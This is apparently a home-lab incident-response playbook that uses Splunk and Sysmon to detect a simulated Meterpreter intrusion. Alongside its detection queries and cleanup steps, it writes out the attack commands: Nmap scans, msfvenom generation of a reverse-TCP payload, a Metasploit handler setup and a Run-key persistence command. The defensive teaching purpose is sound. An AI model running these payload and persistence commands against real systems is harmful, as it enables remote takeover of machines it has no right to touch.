# Incident Response Playbook: Simulated Malware Execution & Persistence
### Splunk Incident Response Lab & Threat Triage Sandbox
**Framework:** NIST SP 800-61 (Computer Security Incident Handling Guide)
**Author:** Tejaswiny
**Environment:** Isolated 2-VM lab — Kali Linux (attacker, 192.168.10.33) → Windows 10 + Splunk Enterprise (victim/SIEM, 192.168.10.34), VMware LAN Segment, no internet egress.

---

##  Overview

This playbook documents the detection, analysis, and response procedure for a simulated multi-stage intrusion carried out in a home SOC lab, structured according to the four phases defined in NIST SP 800-61: **Preparation**, **Detection & Analysis**, **Containment/Eradication/Recovery**, and **Post-Incident Activity**.

The simulated attack chain consisted of:
1. Network reconnaissance (Nmap)
2. Payload delivery and execution (Metasploit/msfvenom reverse-TCP Meterpreter payload, delivered as `Report_final.exe`)
3. Command & Control (C2) callback to the attacker host
4. Persistence via a Windows Registry Run key

---

## 1. Phase 1 — Preparation

Before any attack was simulated, the following visibility and infrastructure was established:

- **Network isolation:** Attacker and victim VMs placed on a dedicated VMware LAN Segment with static IP addressing (192.168.10.0/24), with no NAT/bridged interface — preventing any lab traffic from reaching the host network.
- **Endpoint telemetry:** Sysmon deployed on the Windows 10 victim, configured with the SwiftOnSecurity ruleset to capture process creation (Event ID 1), network connections (Event ID 3), process termination (Event ID 5), and registry value changes (Event ID 13).
- **SIEM ingestion:** Splunk Enterprise installed directly on the victim host. Since forwarders are unnecessary in a single-host architecture, Sysmon's event channel (`Microsoft-Windows-Sysmon/Operational`) was registered directly via a custom `inputs.conf` stanza:
  ```ini
  [WinEventLog://Microsoft-Windows-Sysmon/Operational]
  disabled = 0
  index = main
  renderXml = 0
  ```
- **Baseline validation:** Prior to attack simulation, ingestion was confirmed with:
  ```spl
  index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" earliest=-24h
  | stats count by EventCode
  ```
  This established that Sysmon telemetry was flowing into Splunk in near-real time before any adversary activity began — a prerequisite for trusting the detections that follow.

---

## 2.  Phase 2 — Detection & Analysis

### 2.1 Reconnaissance detection
The attacker performed service/version and vulnerability scans against the victim:
```bash
nmap -sS -sV -O <Windows_IP>
nmap --script vuln 192.168.10.34
```
Windows Firewall silently dropped the majority of probe packets (no response), which meant no completed connection ever reached a process — and therefore Sysmon's Event ID 3 (which only logs *established* connections) recorded nothing for this stage. This is a documented limitation encountered during the lab: **port-scan detection requires firewall-drop logging, not Sysmon, as the data source**, since Sysmon has no visibility into traffic a host never accepted.

### 2.2 Payload execution detection
The attacker generated a Meterpreter reverse-TCP payload and served it for delivery:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.33 LPORT=4444 -f exe -o Report_final.exe
python3 -m http.server 8000
```
A `multi/handler` listener was configured to catch the callback:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.33
set LPORT 4444
exploit
```
Once downloaded and executed on the victim, process creation was confirmed in Splunk:
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*Report_final.exe*"
| table _time, Image, ParentImage, CommandLine, User
```
**Analysis:** This event marks the initial execution timestamp and anchors the rest of the timeline. The `ParentImage` field identifies the launching process (browser/explorer), and `User` confirms the execution context.

### 2.3 Command & Control (C2) detection
A live Meterpreter session was confirmed via `sessions -l` on the attacker side. The resulting network callback was verified in Splunk:
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp="<Kali_IP>"
| table _time, Image, DestinationIp, DestinationPort
```
**Analysis:** Repeated connections from `Report_final.exe` to the attacker's IP on port 4444, observed at short, regular intervals, are consistent with an active C2 channel rather than incidental network activity — the payload was not making a single one-off connection, but maintaining an ongoing session.

### 2.4 Persistence detection
From an interactive shell obtained through the Meterpreter session, a Registry Run key was created to survive reboot/logoff:
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /d "C:\Users\<user>\Downloads\Report_final.exe" /f
```
Detected in Splunk via:
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13
| table _time, TargetObject, Details, Image
```
**Analysis:** The `TargetObject` field resolving to a path under `...\CurrentVersion\Run\Update`, with `Details` pointing to the malicious executable, confirms classic autorun-based persistence — mapped to **MITRE ATT&CK T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)**.

### 2.5 Full attack timeline (correlated view)
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*Report_final.exe*" OR TargetObject="*\\Run\\*"
| table _time, EventCode, Image, TargetObject, Details, CommandLine, DestinationIp
| sort _time
```
This single correlated view reconstructs the kill chain in chronological order: **execution → C2 callback → persistence**, demonstrating end-to-end detection across three independent Sysmon event types rather than relying on any single log source in isolation.

---

## 3. Phase 3 — Containment, Eradication & Recovery

> The steps below reflect the **documented, verified response actions** for this lab. Steps marked *(manual/for production)* were not executed against the lab VM but are included as the correct next action a SOC analyst would take in a live environment, consistent with NIST SP 800-61 guidance.

**Containment**
- Isolate the affected host from the network to prevent further C2 communication or lateral movement — e.g., disabling the virtual network adapter, or applying an outbound firewall block against the attacker IP:
  ```
  netsh advfirewall firewall add rule name="Block-C2-IP" dir=out action=block remoteip=<Kali_IP>
  ```
  *(manual/for production — recommended immediate action upon detecting the Event ID 3 C2 beacon)*

**Eradication**
- Terminate the malicious process (`Report_final.exe`) by PID, identified via Sysmon Event ID 1.
- Remove the persistence mechanism:
  ```
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /f
  ```
- Delete the malicious binary from disk.

**Recovery**
- Re-verify the Run key is clear:
  ```
  reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
  ```
- Re-run the full timeline SPL query with an updated time window to confirm no further Event ID 1/3/13 activity tied to the payload.
- In a production environment: restore from a known-clean backup or snapshot if compromise scope is uncertain, rather than relying solely on manual cleanup.

---

## 4. Phase 4 — Post-Incident Activity

- **Detection gap identified:** Sysmon alone could not detect the reconnaissance stage, since Windows Firewall silently dropped scan traffic before any process-level event was generated. **Recommendation:** enable Windows Firewall logging (`Set-NetFirewallProfile -LogBlocked True`) or Security Event ID 5152 auditing as a complementary data source for scan detection in future iterations.
- **Detection tuning:** The current C2 detection relies on raw connection listing. A stronger version — calculating beacon interval regularity (jitter) via `streamstats` — would reduce false positives by distinguishing mechanically regular C2 check-ins from normal, irregular human browsing traffic, and should be adopted as the production detection query rather than the raw connection table.
- **Lessons learned:** Sysmon must be explicitly configured with a full ruleset (e.g., SwiftOnSecurity config) — the default installation only logs process create/terminate events and silently omits network and registry visibility, which would leave C2 and persistence activity completely undetected if not caught during initial setup validation.
- **Next steps:** Formalize the above detections as saved Splunk alerts (not ad-hoc searches), and build a consolidated dashboard surfacing all four detection stages for real-time triage.

---

## Appendix: MITRE ATT&CK Mapping

| Stage | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595 |
| Execution | User Execution | T1204 |
| Command and Control | Application Layer Protocol | T1071 |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 |
